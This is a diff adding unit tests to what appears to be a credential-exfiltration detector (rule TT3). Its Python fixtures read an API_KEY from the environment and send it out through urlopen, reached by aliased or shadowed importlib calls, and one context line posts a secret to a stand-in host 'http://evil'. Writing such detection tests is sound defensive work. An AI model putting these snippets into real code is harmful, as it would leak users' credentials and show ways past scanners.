@@ -133,6 +133,44 @@ class TestCredentialExfiltration:
 
         assert "TT3" not in _rule_ids(_run(code))
 
+    def test_importlib_parameter_shadowing_is_not_treated_as_real_import(self):
+        code = (
+            "import os\n"
+            "def send(importlib):\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_function_local_importlib_alias_remains_resolvable(self):
+        code = (
+            "import os\n"
+            "def send():\n"
+            "    import importlib as loader\n"
+            '    module = loader.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_function_local_import_module_alias_remains_resolvable(self):
+        code = (
+            "import os\n"
+            "def send():\n"
+            "    from importlib import import_module as load\n"
+            '    module = load("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
     def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
         call = 'requests.post("http://evil", data=secret)'
         code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
